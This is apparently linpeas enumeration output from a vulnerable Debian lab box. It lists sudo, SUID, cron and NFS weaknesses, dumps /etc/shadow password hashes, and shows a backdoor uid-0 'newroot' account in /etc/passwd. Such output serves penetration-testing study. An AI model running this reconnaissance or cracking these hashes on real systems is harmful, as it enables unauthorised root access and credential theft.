daemon    1384  0.0  0.0   8136   616 ?        Ss   03:25   0:00 /sbin/portmap
root       270  0.0  0.0  16968   968 ?        S<s  03:23   0:00 udevd --daemon
root      1050  0.0  0.0  16968   888 ?        S<   03:25   0:00 udevd --daemon
root      1051  0.0  0.0  16968   816 ?        S<   03:25   0:00 udevd --daemon
root      1354  0.0  0.0   6796  1024 ?        Ss   03:25   0:00 dhclient -v -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root      1430  0.0  0.0  27064   592 ?        Ss   03:25   0:00 /usr/sbin/rpc.idmapd
root      1662  0.0  0.1  54336  1688 ?        Sl   03:25   0:00 /usr/sbin/rsyslogd -c4
root      1762  0.0  0.0   3960   640 ?        Ss   03:25   0:00 /usr/sbin/acpid
root      1817  0.0  0.1  18848  1200 ?        Ss   03:25   0:00 /usr/sbin/rpc.mountd --manage-gids
root      1851  0.0  0.3  71424  3260 ?        Ss   03:25   0:00 /usr/sbin/apache2 -k start
root      1985  0.0  0.1  22468  1068 ?        Ss   03:25   0:00 /usr/sbin/cron
root      2027  0.0  0.1   9180  1396 ?        S    03:25   0:00 /bin/sh /usr/bin/mysqld_safe
root      2029  0.0  0.1  49224  1164 ?        Ss   03:25   0:00 /usr/sbin/sshd
root      2057  0.0  0.1  61864  1312 ?        Ss   03:25   0:00 nginx: master process /usr/sbin/nginx
root      2176  0.0  2.3 165668 24392 ?        Sl   03:25   0:02 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
root      2177  0.0  0.0   3896   640 ?        S    03:25   0:00 logger -t mysqld -p daemon.error
root      2609  0.0  0.0   5972   632 tty1     Ss+  03:25   0:00 /sbin/getty 38400 tty1
root      2610  0.0  0.0   5972   636 tty2     Ss+  03:25   0:00 /sbin/getty 38400 tty2
root      2611  0.0  0.0   5972   632 tty3     Ss+  03:25   0:00 /sbin/getty 38400 tty3
root      2612  0.0  0.0   5972   632 tty4     Ss+  03:25   0:00 /sbin/getty 38400 tty4
root      2613  0.0  0.0   5972   636 tty5     Ss+  03:25   0:00 /sbin/getty 38400 tty5
root      2614  0.0  0.0   5972   636 tty6     Ss+  03:25   0:00 /sbin/getty 38400 tty6
statd     1416  0.0  0.0  14424   900 ?        Ss   03:25   0:00 /sbin/rpc.statd
user      2767  0.0  0.2  71332  2544 ?        S    03:42   0:00 sshd: user@pts/0 
user      2768  0.0  0.2  19304  2128 pts/0    Ss   03:42   0:00 -bash
user      5462  0.0  0.1  17724  1916 pts/0    S    06:57   0:00 /bin/bash -p
user      6640  3.0  0.2  18604  2360 pts/0    S+   07:42   0:00 /bin/sh ./linpeas.sh
user      7091  0.0  0.1  14860  1068 pts/0    R+   07:42   0:00 ps aux
user      7093  0.0  0.0  58392   748 pts/0    S+   07:42   0:00 sort
www-data  2062  0.0  0.1  62232  1828 ?        S    03:25   0:00 nginx: worker process
www-data  2063  0.0  0.1  62232  1844 ?        S    03:25   0:00 nginx: worker process
www-data  2064  0.0  0.1  62232  1844 ?        S    03:25   0:00 nginx: worker process
www-data  2065  0.0  0.1  62232  1824 ?        S    03:25   0:00 nginx: worker process
www-data  4683  0.0  0.1  71424  2000 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
www-data  4684  0.0  0.2 294852  2668 ?        Sl   06:25   0:00 /usr/sbin/apache2 -k start
www-data  4685  0.0  0.2 294852  2688 ?        Sl   06:25   0:00 /usr/sbin/apache2 -k start

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                                                    
912K -rwxr-xr-x 1 root root 905K Apr 10  2010 /bin/bash                                                                                                                                                      
   0 lrwxrwxrwx 1 root root    4 May 14  2017 /bin/sh -> bash
 20K -rwxr-xr-x 2 root root  20K Jan 25  2011 /sbin/getty
 24K -rwxr-xr-x 1 root root  21K Feb 24  2010 /sbin/portmap
 72K -rwxr-xr-x 1 root root  65K Dec 13  2014 /sbin/rpc.statd
 44K -rwxr-xr-x 1 root root  41K May  1  2012 /usr/sbin/acpid
   0 lrwxrwxrwx 1 root root   33 May 13  2017 /usr/sbin/apache2 -> ../lib/apache2/mpm-worker/apache2
 44K -rwxr-xr-x 1 root root  41K Dec 18  2010 /usr/sbin/cron
   0 lrwxrwxrwx 1 root root    4 May 13  2017 /usr/sbin/exim4 -> exim
9.7M -rwxr-xr-x 1 root root 9.7M Oct 21  2014 /usr/sbin/mysqld
 32K -rwxr-xr-x 1 root root  32K Dec 13  2014 /usr/sbin/rpc.idmapd
 92K -rwxr-xr-x 1 root root  88K Dec 13  2014 /usr/sbin/rpc.mountd
328K -rwxr-xr-x 1 root root 321K Nov 30  2010 /usr/sbin/rsyslogd
472K -rwxr-xr-x 1 root root 465K Apr  2  2014 /usr/sbin/sshd

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                                                               
-rw-r--r-- 1 root root  804 May 13  2017 /etc/crontab                                                                                                                                                        

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 May 15  2020 .
drwxr-xr-x 67 root root 4096 Feb 14 07:24 ..
-rw-r--r--  1 root root  102 Dec 18  2010 .placeholder
-rw-r--r--  1 root root  607 Oct 17  2009 john

/etc/cron.daily:
total 72
drwxr-xr-x  2 root root  4096 May 13  2017 .
drwxr-xr-x 67 root root  4096 Feb 14 07:24 ..
-rw-r--r--  1 root root   102 Dec 18  2010 .placeholder
-rwxr-xr-x  1 root root   633 Jul 28  2015 apache2
-rwxr-xr-x  1 root root 14799 Apr 15  2011 apt
-rwxr-xr-x  1 root root   314 Aug 10  2011 aptitude
-rwxr-xr-x  1 root root   502 Jun 17  2010 bsdmainutils
-rwxr-xr-x  1 root root   256 Jun  5  2014 dpkg
-rwxr-xr-x  1 root root  4109 Oct 25  2012 exim4-base
-rwxr-xr-x  1 root root  2211 Oct 26  2010 locate
-rwxr-xr-x  1 root root    89 Apr 17  2010 logrotate
-rwxr-xr-x  1 root root  1335 Jan  2  2011 man-db
-rwxr-xr-x  1 root root   249 Feb 15  2011 passwd
-rwxr-xr-x  1 root root  3594 Dec 18  2010 standard

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May 12  2017 .
drwxr-xr-x 67 root root 4096 Feb 14 07:24 ..
-rw-r--r--  1 root root  102 Dec 18  2010 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 May 12  2017 .
drwxr-xr-x 67 root root 4096 Feb 14 07:24 ..
-rw-r--r--  1 root root  102 Dec 18  2010 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 May 12  2017 .
drwxr-xr-x 67 root root 4096 Feb 14 07:24 ..
-rw-r--r--  1 root root  102 Dec 18  2010 .placeholder
-rwxr-xr-x  1 root root  895 Jan  2  2011 man-db

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh


[+] Services
[i] Search for outdated versions                                                                                                                                                                             
 [ + ]  acpid                                                                                                                                                                                                
 [ + ]  apache2
 [ - ]  bootlogd
 [ - ]  bootlogs
 [ - ]  checkroot.sh
 [ - ]  exim4
 [ - ]  hostname.sh
 [ + ]  nfs-common
 [ + ]  nfs-kernel-server
 [ + ]  nginx
 [ + ]  portmap
 [ - ]  rmnologin
 [ + ]  rsyslog
 [ + ]  ssh
 [ - ]  stop-bootlogd
 [ - ]  stop-bootlogd-single
 [ - ]  urandom

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path                                                                                                                                 
                                                                                                                                                                                                             
[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services                                                                                                                                     
You can't write on systemd PATH so I'm not going to list relative paths executed by services                                                                                                                 

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                                                                       
                                                                                                                                                                                                             
[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                                                                       
                                                                                                                                                                                                             
[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                                                                      
                                                                                                                                                                                                             
[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                                                                      
                                                                                                                                                                                                             
[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                                                                        
                                                                                                                                                                                                             

===================================( Network Information )====================================
[+] Hostname, hosts and DNS                                                                                                                                                                                  
debian                                                                                                                                                                                                       
127.0.0.1       localhost
127.0.1.1       debian.localdomain      debian

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
domain ec2.internal
search ec2.internal
nameserver 10.65.0.2
localdomain

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found                                                                                                                                                                                    
                                                                                                                                                                                                             
[+] Networks and neighbours
default         0.0.0.0                                                                                                                                                                                      
loopback        127.0.0.0
link-local      169.254.0.0

eth0      Link encap:Ethernet  HWaddr 0e:2c:39:2f:4f:f5  
          inet addr:10.65.167.239  Bcast:10.65.191.255  Mask:255.255.192.0
          inet6 addr: fe80::c2c:39ff:fe2f:4ff5/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:6675 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3816 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:489380 (477.9 KiB)  TX bytes:2252527 (2.1 MiB)
          Interrupt:20 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:104 errors:0 dropped:0 overruns:0 frame:0
          TX packets:104 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:8756 (8.5 KiB)  TX bytes:8756 (8.5 KiB)

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
10.65.128.0     *               255.255.192.0   U     0      0        0 eth0
default         ip-10-65-128-1. 0.0.0.0         UG    0      0        0 eth0

[+] Iptables rules
iptables rules Not Found                                                                                                                                                                                     
                                                                                                                                                                                                             
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                                                                          
Active Internet connections (servers and established)                                                                                                                                                        
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:42322           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:33685           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:35303           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0   3800 10.65.167.239:22        192.168.144.77:50426    ESTABLISHED -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp        0      0 127.0.0.1:744           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               
udp        0      0 0.0.0.0:43768           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:2049            0.0.0.0:*                           -               
udp        0      0 0.0.0.0:50181           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:33948           0.0.0.0:*                           -               

[+] Can I sniff with tcpdump?
No                                                                                                                                                                                                           
                                                                                                                                                                                                             

====================================( Users Information )=====================================
[+] My user                                                                                                                                                                                                  
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                                                                       
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)                                                                                                 

[+] Do I have PGP keys?
                                                                                                                                                                                                             
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                                                                                                                                                     
                                                                                                                                                                                                             
[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                         
Matching Defaults entries for user on this host:                                                                                                                                                             
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more

[+] Checking /etc/doas.conf
/etc/doas.conf Not Found                                                                                                                                                                                     
                                                                                                                                                                                                             
[+] Checking Pkexec policy
                                                                                                                                                                                                             
[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                                                            
                                                                                                                                                                                                             
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                              
newroot:wA9PdBLNI5zuY:0:0:newroot:/root:/bin/bash

[+] Users with console
backup:x:34:34:backup:/var/backups:/bin/sh                                                                                                                                                                   
bin:x:2:2:bin:/bin:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
games:x:5:60:games:/usr/games:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
newroot:wA9PdBLNI5zuY:0:0:newroot:/root:/bin/bash
news:x:9:9:news:/var/spool/news:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
root:x:0:0:root:/root:/bin/bash
sys:x:3:3:sys:/dev:/bin/sh
user:x:1000:1000:user,,,:/home/user:/bin/bash
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                       
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
uid=101(Debian-exim) gid=103(Debian-exim) groups=103(Debian-exim)
uid=102(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=103(statd) gid=65534(nogroup) groups=65534(nogroup)
uid=104(mysql) gid=106(mysql) groups=106(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

[+] Login now
 07:42:40 up  4:19,  1 user,  load average: 0.00, 0.00, 0.00                                                                                                                                                 
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
user     pts/0    ip-192-168-144-7 03:42    1.00s  0.21s  0.00s w

[+] Last logons
root     pts/1        ip-192-168-144-7 Sat Feb 14 06:44 - 06:44  (00:00)                                                                                                                                     

wtmp begins Sat Feb 14 06:44:46 2026

[+] Last time logon each user
Username         Port     From             Latest                                                                                                                                                            
root             pts/1    ip-192-168-144-7 Sat Feb 14 06:44:46 -0500 2026
newroot          pts/1    ip-192-168-144-7 Sat Feb 14 06:44:46 -0500 2026
user             pts/0    ip-192-168-144-7 Sat Feb 14 03:42:23 -0500 2026

[+] Password policy
PASS_MAX_DAYS   99999                                                                                                                                                                                        
PASS_MIN_DAYS   0
PASS_WARN_AGE   7


===================================( Software Information )===================================
[+] MySQL version                                                                                                                                                                                            
mysql  Ver 14.14 Distrib 5.1.73, for debian-linux-gnu (x86_64) using readline 6.1                                                                                                                            

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                                                                                                                                                  
[+] MySQL connection using root/NOPASS ................. Yes                                                                                                                                                 
[+] Looking for mysql credentials and exec
From '/etc/mysql/my.cnf' Mysql user: user = root                                                                                                                                                             
Found readable /etc/mysql/my.cnf
[client]
port            = 3306
socket          = /var/run/mysqld/mysqld.sock
[mysqld_safe]
socket          = /var/run/mysqld/mysqld.sock
nice            = 0
[mysqld]
user = root
pid-file        = /var/run/mysqld/mysqld.pid
socket          = /var/run/mysqld/mysqld.sock
port            = 3306
basedir         = /usr
datadir         = /var/lib/mysql
tmpdir          = /tmp
language        = /usr/share/mysql/english
skip-external-locking
bind-address            = 127.0.0.1
key_buffer              = 16M
max_allowed_packet      = 16M
thread_stack            = 192K
thread_cache_size       = 8
myisam-recover         = BACKUP
query_cache_limit       = 1M
query_cache_size        = 16M
expire_logs_days        = 10
max_binlog_size         = 100M
[mysqldump]
quick
quote-names
max_allowed_packet      = 16M
[mysql]
[isamchk]
key_buffer              = 16M
!includedir /etc/mysql/conf.d/
From '/usr/share/mysql/debian-start.inc.sh' Mysql user:   ret=$( echo "SELECT count(*) FROM mysql.user WHERE user='root' and password='';" | $MYSQL --skip-column-names )

[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                                                                     
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                                                                     
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                                                                     
                                                                                                                                                                                                             
[+] Apache server info
Version: Server version: Apache/2.2.16 (Debian)                                                                                                                                                              
Server built:   Jul 28 2015 09:24:24

[+] Looking for PHPCookies
 Not Found                                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] Looking for Wordpress wp-config.php files
wp-config.php Not Found                                                                                                                                                                                      
                                                                                                                                                                                                             
[+] Looking for Drupal settings.php files
/default/settings.php Not Found                                                                                                                                                                              
                                                                                                                                                                                                             
[+] Looking for Tomcat users file
tomcat-users.xml Not Found                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] Mongo information
 Not Found                                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] Looking for supervisord configuration file
supervisord.conf Not Found                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] Looking for cesi configuration file
cesi.conf Not Found                                                                                                                                                                                          
                                                                                                                                                                                                             
[+] Looking for Rsyncd config file
rsyncd.conf Not Found                                                                                                                                                                                        
[+] Looking for Hostapd config file                                                                                                                                                                          
hostapd.conf Not Found                                                                                                                                                                                       
                                                                                                                                                                                                             
[+] Looking for wifi conns file
 Not Found                                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] Looking for Anaconda-ks config files
anaconda-ks.cfg Not Found                                                                                                                                                                                    
                                                                                                                                                                                                             
[+] Looking for .vnc directories and their passwd files
.vnc Not Found                                                                                                                                                                                               
                                                                                                                                                                                                             
[+] Looking for ldap directories and their hashes
/etc/ldap                                                                                                                                                                                                    
The password hash is from the {SSHA} to 'structural'

[+] Looking for .ovpn files and credentials
/home/user/myvpn.ovpn                                                                                                                                                                                        
auth-user-pass /etc/openvpn/auth.txt

[+] Looking for ssl/ssh files
Port 22                                                                                                                                                                                                      
PermitRootLogin yes
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
 --> /etc/hosts.allow file found, read the rules:



Looking inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

[+] Looking for unexpected auth lines in /etc/pam.d/sshd
auth       required     pam_env.so # [1]                                                                                                                                                                     
auth       required     pam_env.so envfile=/etc/default/locale

[+] Looking for Cloud credentials (AWS, Azure, GC)
                                                                                                                                                                                                             
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                                                                       
                                                                                                                                                                                                             
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)



[+] Looking for kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                                                                        
krb5.conf Not Found                                                                                                                                                                                          
tickets kerberos Not Found                                                                                                                                                                                   
klist Not Found                                                                                                                                                                                              
                                                                                                                                                                                                             
[+] Looking for Kibana yaml
kibana.yml Not Found                                                                                                                                                                                         
                                                                                                                                                                                                             
[+] Looking for Knock configuration
Knock.config Not Found                                                                                                                                                                                       
                                                                                                                                                                                                             
[+] Looking for logstash files
 Not Found                                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] Looking for elasticsearch files
 Not Found                                                                                                                                                                                                   
                                                                                                                                                                                                             
[+] Looking for Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                                                                                                               
                                                                                                                                                                                                             
[+] Looking for AD cached hashes
cached hashes Not Found                                                                                                                                                                                      
                                                                                                                                                                                                             
[+] Looking for screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                                                                          
screen Not Found                                                                                                                                                                                             
                                                                                                                                                                                                             
[+] Looking for tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                                                                          
tmux Not Found                                                                                                                                                                                               
                                                                                                                                                                                                             
[+] Looking for Couchdb directory
                                                                                                                                                                                                             
[+] Looking for redis.conf
                                                                                                                                                                                                             
[+] Looking for dovecot files
dovecot credentials Not Found                                                                                                                                                                                
                                                                                                                                                                                                             
[+] Looking for mosquitto.conf
                                                                                                                                                                                                             
[+] Looking for neo4j auth file
                                                                                                                                                                                                             
[+] Looking Cloud-Init conf file
                                                                                                                                                                                                             
[+] Looking Erlang cookie file
                                                                                                                                                                                                             

====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms                                                                                                                                                      
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                         
/usr/bin/chsh                                                                                                                                                                                                
/usr/bin/sudo           --->    /sudo$
/usr/bin/newgrp         --->    HP-UX_10.20
/usr/bin/sudoedit               --->    Sudo/SudoEdit_1.6.9p21/1.7.2p4/(RHEL_5/6/7/Ubuntu)/Sudo<=1.8.14
/usr/bin/passwd         --->    Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/usr/bin/gpasswd
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown               --->    GNU_glibc_2.1/2.1.1_-6(08-1999)
/bin/ping6
/bin/ping
/bin/mount              --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/bin/su
/bin/umount             --->    BSD/Linux(08-1996)
/sbin/mount.nfs

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                         
/usr/bin/expiry                                                                                                                                                                                              
/usr/bin/ssh-agent
/usr/bin/bsd-write
/usr/bin/crontab
/usr/bin/chage
/usr/bin/wall
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/sbin/unix_chkpwd

[+] Writable folders configured in /etc/ld.so.conf.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d                                                                                                                             
/usr/local/lib                                                                                                                                                                                               
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                                                                 
                                                                                                                                                                                                             
[+] Users with capabilities
/etc/security/capability.conf Not Found                                                                                                                                                                      
                                                                                                                                                                                                             
[+] Files with ACLs
files with acls in searched folders Not Found                                                                                                                                                                
                                                                                                                                                                                                             
[+] .sh files in path
/usr/local/bin/overwrite.sh                                                                                                                                                                                  
/usr/local/bin/compress.sh
/usr/bin/gettext.sh

[+] Unexpected folders in root
/.ssh                                                                                                                                                                                                        
/selinux

[+] Files (scripts) in /etc/profile.d/
total 8                                                                                                                                                                                                      
drwxr-xr-x  2 root root 4096 Jun 11  2014 .
drwxr-xr-x 67 root root 4096 Feb 14 07:24 ..

[+] Hashes inside passwd file? ........... newroot:wA9PdBLNI5zuY:0:0:newroot:/root:/bin/bash
[+] Hashes inside group file? ............ No
[+] Credentials in fstab/mtab? ........... No                                                                                                                                                                
[+] Can I read shadow files? ............. root:$6$7f9n5vRK/uU$eCSSW8NqxeXcYgsCVLAGg5T6GN7fXOV5vOArX3jg0xZR1GXIEdjohL3/vQZjvF0Bz3y..XsEvdguLddxfK/bq.:17298:0:99999:7:::                                     
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
[+] Can I read root folder? .............. No
                                                                                                                                                                                                             
[+] Looking for root files in home dirs (limit 20)
/home                                                                                                                                                                                                        

[+] Looking for others files in folders owned by me
                                                                                                                                                                                                             
[+] Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                                                             
[+] Modified interesting files in the last 5mins
/var/log/auth.log                                                                                                                                                                                            
/var/log/syslog
/tmp/backup.tar.gz
/home/user/.gnupg/pubring.gpg
/home/user/.gnupg/gpg.conf
/home/user/.gnupg/trustdb.gpg

[+] Writable log files (logrotten)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                                                                                                       
                                                                                                                                                                                                             
[+] Files inside /home/user (limit 20)
total 76                                                                                                                                                                                                     
drwxr-xr-x 7 user user 4096 Feb 14 07:42 .
drwxr-xr-x 3 root root 4096 May 15  2017 ..
-rw------- 1 user user  293 Feb 14 06:59 .bash_history
-rw-r--r-- 1 user user  220 May 12  2017 .bash_logout
-rw-r--r-- 1 user user 3235 May 14  2017 .bashrc
drwxr-xr-x 2 user user 4096 Feb 14 06:08 .config
drwx------ 2 user user 4096 Feb 14 07:42 .gnupg
drwxr-xr-x 2 user user 4096 May 13  2017 .irssi
drwx------ 2 user user 4096 May 15  2020 .john
-rw------- 1 user user  137 May 15  2017 .lesshst
-rw------- 1 user user  332 Feb 14 03:51 .mysql_history
-rw------- 1 user user   11 May 15  2020 .nano_history
-rw-r--r-- 1 user user  725 May 13  2017 .profile
-rw------- 1 user user 6695 Feb 14 05:35 .viminfo
-rw-r--r-- 1 user user  212 May 15  2017 myvpn.ovpn
-rwxr-xr-x 1 user user 6697 Feb 14 06:14 service
drwxr-xr-x 8 user user 4096 May 15  2020 tools

[+] Files inside others home (limit 20)
                                                                                                                                                                                                             
[+] Looking for installed mail applications
exim.conf                                                                                                                                                                                                    
exim
exim-4.84-3
sendmail

[+] Mails (limit 50)
                                                                                                                                                                                                             
[+] Backup files?
-rw-r--r-- 1 root root 154727 May 12  2017 /var/lib/aptitude/pkgstates.old                                                                                                                                   
-rw-r--r-- 1 root root 673 May 14  2017 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 May 14  2017 /etc/xml/catalog.old
